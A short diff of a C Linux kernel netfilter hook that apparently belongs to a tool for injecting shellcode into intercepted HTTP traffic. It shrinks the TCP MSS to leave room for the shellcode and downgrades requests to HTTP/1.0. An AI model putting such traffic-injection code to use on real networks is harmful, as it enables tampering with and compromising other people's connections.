@@ -149,7 +149,6 @@ unsigned int hook_func(unsigned int hooknum, struct sk_buff *skb, const struct n
 		unsigned int tcplen = skb->len - (iph->ihl*4) - (tcph->doff*4);
 
 		// printk(KERN_ALERT "hook_ipv4: %pI4:%d --> %pI4:%d \n", &saddr, sport, &daddr, dport);
-		set_tcp_mss(skb, tcph, 1500 - strlen(shellcode));
 
 		// 接收到的数据包
 		if (sport == 80)
@@ -225,6 +224,7 @@ unsigned int hook_func(unsigned int hooknum, struct sk_buff *skb, const struct n
 		// 发出的数据包
 		else if (dport == 80)
 		{
+			set_tcp_mss(skb, tcph, 1500 - strlen(shellcode));
 			// 请求头HTTP 1.1 --> HTTP 1.0
 			// 防止收到chunked数据包（Transfer-Encoding： chunked是HTTP 1.1中特有的）
 			char *pK = strstr(pkg,"HTTP/1.1");
